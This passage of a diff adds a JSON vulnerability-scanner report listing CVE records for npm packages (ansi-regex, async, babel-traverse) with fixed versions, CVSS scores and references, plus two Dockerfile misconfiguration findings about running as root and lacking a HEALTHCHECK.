+              "V2Score": 7.8,
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2022:6595",
+            "https://access.redhat.com/security/cve/CVE-2021-3807",
+            "https://app.snyk.io/vuln/SNYK-JS-ANSIREGEX-1583908",
+            "https://bugzilla.redhat.com/1907444",
+            "https://bugzilla.redhat.com/1945459",
+            "https://bugzilla.redhat.com/1964461",
+            "https://bugzilla.redhat.com/2007557",
+            "https://bugzilla.redhat.com/2098556",
+            "https://bugzilla.redhat.com/2102001",
+            "https://bugzilla.redhat.com/2105422",
+            "https://bugzilla.redhat.com/2105426",
+            "https://bugzilla.redhat.com/2105428",
+            "https://bugzilla.redhat.com/2105430",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=1907444",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=1945459"
+          ],
+          "PublishedDate": "2021-09-17T07:15:09.273Z",
+          "LastModifiedDate": "2026-10-08T22:17:11.557Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2021-3807",
+          "VendorIDs": [
+            "GHSA-93q8-gq69-wqmw"
+          ],
+          "PkgID": "ansi-regex@5.0.0",
+          "PkgName": "ansi-regex",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/ansi-regex@5.0.0",
+            "UID": "cca386fa1954603d"
+          },
+          "InstalledVersion": "5.0.0",
+          "FixedVersion": "6.0.1, 5.0.1, 4.1.1, 3.0.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2021-3807",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:ab71e046126860429b588166be44db5f6b4669f1af47774a38088cbe84496d20",
+          "Title": "nodejs-ansi-regex: Regular expression denial of service (ReDoS) matching ANSI escape codes",
+          "Description": "ansi-regex is vulnerable to Inefficient Regular Expression Complexity",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-1333"
+          ],
+          "VendorSeverity": {
+            "alma": 2,
+            "ghsa": 3,
+            "nvd": 3,
+            "oracle-oval": 2,
+            "redhat": 2,
+            "rocky": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "nvd": {
+              "V2Vector": "AV:N/AC:L/Au:N/C:N/I:N/A:C",
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V2Score": 7.8,
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2022:6595",
+            "https://access.redhat.com/security/cve/CVE-2021-3807",
+            "https://app.snyk.io/vuln/SNYK-JS-ANSIREGEX-1583908",
+            "https://bugzilla.redhat.com/1907444",
+            "https://bugzilla.redhat.com/1945459",
+            "https://bugzilla.redhat.com/1964461",
+            "https://bugzilla.redhat.com/2007557",
+            "https://bugzilla.redhat.com/2098556",
+            "https://bugzilla.redhat.com/2102001",
+            "https://bugzilla.redhat.com/2105422",
+            "https://bugzilla.redhat.com/2105426",
+            "https://bugzilla.redhat.com/2105428",
+            "https://bugzilla.redhat.com/2105430",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=1907444",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=1945459"
+          ],
+          "PublishedDate": "2021-09-17T07:15:09.273Z",
+          "LastModifiedDate": "2026-10-08T22:17:11.557Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2021-43138",
+          "VendorIDs": [
+            "GHSA-fwr7-v2mv-hh25"
+          ],
+          "PkgID": "async@2.6.3",
+          "PkgName": "async",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/async@2.6.3",
+            "UID": "a5d15bc3fdd48af3"
+          },
+          "InstalledVersion": "2.6.3",
+          "FixedVersion": "3.2.2, 2.6.4",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2021-43138",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:831b0e038af568c926cc3e6e5c442c625e804ded9ad667cd5c34d43718c7dc46",
+          "Title": "async: Prototype Pollution in async",
+          "Description": "In Async before 2.6.4 and 3.x before 3.2.2, a malicious user can obtain privileges via the mapValues() method, aka lib/internal/iterator.js createObjectIterator prototype pollution.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-1321"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+              "V3Score": 7.8
+            },
+            "nvd": {
+              "V2Vector": "AV:N/AC:M/Au:N/C:P/I:P/A:P",
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+              "V2Score": 6.8,
+              "V3Score": 7.8
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+              "V3Score": 7.8
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2021-43138",
+            "https://github.com/advisories/GHSA-fwr7-v2mv-hh25",
+            "https://github.com/caolan/async",
+            "https://github.com/caolan/async/blob/master/lib/internal/iterator.js",
+            "https://github.com/caolan/async/blob/master/lib/mapValuesLimit.js",
+            "https://github.com/caolan/async/blob/v2.6.4/CHANGELOG.md#v264",
+            "https://github.com/caolan/async/commit/8f7f90342a6571ba1c197d747ebed30c368096d2",
+            "https://github.com/caolan/async/commit/e1ecdbf79264f9ab488c7799f4c76996d5dca66d",
+            "https://github.com/caolan/async/compare/v2.6.3...v2.6.4",
+            "https://github.com/caolan/async/pull/1828",
+            "https://jsfiddle.net/oz5twjd9",
+            "https://jsfiddle.net/oz5twjd9/",
+            "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/MTEUUTNIEBHGKUKKLNUZSV7IEP6IP3Q3",
+            "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/MTEUUTNIEBHGKUKKLNUZSV7IEP6IP3Q3/",
+            "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UM6XJ73Q3NAM5KSGCOKJ2ZIA6GUWUJLK"
+          ],
+          "PublishedDate": "2022-04-06T17:15:08.65Z",
+          "LastModifiedDate": "2026-06-17T04:10:32.767Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2023-45133",
+          "VendorIDs": [
+            "GHSA-67hx-6x53-jw92"
+          ],
+          "PkgID": "babel-traverse@6.26.0",
+          "PkgName": "babel-traverse",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/babel-traverse@6.26.0",
+            "UID": "1605258add92e56e"
+          },
+          "InstalledVersion": "6.26.0",
+          "FixedVersion": "7.23.2",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2023-45133",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:43682a827e3a8e063f87e9d527601afeb6f78169b5b6133edbac8ead285606ae",
+          "Title": "babel: arbitrary code execution",
+          "Description": "Babel is a compiler for writingJavaScript. In `@babel/traverse` prior to versions 7.23.2 and 8.0.0-alpha.4 and all versions of `babel-traverse`, using Babel to compile code that was specifically crafted by an attacker can lead to arbitrary code execution during compilation, when using plugins that rely on the `path.evaluate()`or `path.evaluateTruthy()` internal Babel methods. Known affected plugins are `@babel/plugin-transform-runtime`; `@babel/preset-env` when using its `useBuiltIns` option; and any \"polyfill provider\" plugin that depends on `@babel/helper-define-polyfill-provider`, such as `babel-plugin-polyfill-corejs3`, `babel-plugin-polyfill-corejs2`, `babel-plugin-polyfill-es-shims`, `babel-plugin-polyfill-regenerator`. No other plugins under the `@babel/` namespace are impacted, but third-party plugins might be. Users that only compile trusted code are not impacted. The vulnerability has been fixed in `@babel/traverse@7.23.2` and `@babel/traverse@8.0.0-alpha.4`. Those who cannot upgrade `@babel/traverse` and are using one of the affected packages mentioned above should upgrade them to their latest version to avoid triggering the vulnerable code path in affected `@babel/traverse` versions: `@babel/plugin-transform-runtime` v7.23.2, `@babel/preset-env` v7.23.2, `@babel/helper-define-polyfill-provider` v0.4.3, `babel-plugin-polyfill-corejs2` v0.4.6, `babel-plugin-polyfill-corejs3` v0.8.5, `babel-plugin-polyfill-es-shims` v0.10.0, `babel-plugin-polyfill-regenerator` v0.5.3.",
+          "Severity": "CRITICAL",
+          "CweIDs": [
+            "CWE-184",
+            "CWE-697"
+          ],
+          "VendorSeverity": {
+            "ghsa": 4,
+            "nvd": 3,
+            "redhat": 3,
+            "ubuntu": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+              "V3Score": 9.4
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+              "V3Score": 8.8
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+              "V3Score": 8.8
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2023-45133",
+            "https://babeljs.io/blog/2023/10/16/cve-2023-45133",
+            "https://github.com/babel/babel",
+            "https://github.com/babel/babel/commit/b13376b346946e3f62fc0848c1d2a23223314c82",
+            "https://github.com/babel/babel/pull/16033",
+            "https://github.com/babel/babel/releases/tag/v7.23.2",
+            "https://github.com/babel/babel/releases/tag/v8.0.0-alpha.4",
+            "https://github.com/babel/babel/security/advisories/GHSA-67hx-6x53-jw92",
+            "https://lists.debian.org/debian-lts-announce/2023/10/msg00026.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2023-45133",
+            "https://www.cve.org/CVERecord?id=CVE-2023-45133",
+            "https://www.debian.org/security/2023/dsa-5528"
+          ],
+          "PublishedDate": "2023-10-12T17:15:09.797Z",
+          "LastModifiedDate": "2026-06-17T06:28:17.02Z"
+        }
+      ]
+    },
+    {
+      "Target": "Dockerfile",
+      "Class": "config",
+      "Type": "dockerfile",
+      "MisconfSummary": {
+        "Successes": 25,
+        "Failures": 2
+      },
+      "Misconfigurations": [
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0002",
+          "Title": "Image user should not be 'root'",
+          "Description": "Running containers with 'root' user can lead to a container escape situation. It is a best practice to run containers as non-root users, which can be done by adding a 'USER' statement to the Dockerfile.",
+          "Message": "Specify at least 1 USER command in Dockerfile with non-root user as argument",
+          "Namespace": "builtin.dockerfile.DS002",
+          "Query": "data.builtin.dockerfile.DS002.deny",
+          "Resolution": "Add 'USER <non root user name>' line to the Dockerfile",
+          "Severity": "HIGH",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0002",
+          "References": [
+            "https://docs.docker.com/develop/develop-images/dockerfile_best-practices/",
+            "https://avd.aquasec.com/misconfig/ds-0002"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        },
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0026",
+          "Title": "No HEALTHCHECK defined",
+          "Description": "You should add HEALTHCHECK instruction in your docker container images to perform the health check on running containers.",
+          "Message": "Add HEALTHCHECK instruction in your Dockerfile",
+          "Namespace": "builtin.dockerfile.DS026",
+          "Query": "data.builtin.dockerfile.DS026.deny",
+          "Resolution": "Add HEALTHCHECK instruction in Dockerfile",
+          "Severity": "LOW",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0026",
+          "References": [
+            "https://blog.aquasec.com/docker-security-best-practices",
+            "https://avd.aquasec.com/misconfig/ds-0026"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        }
+      ]
+    }
+  ]
+}
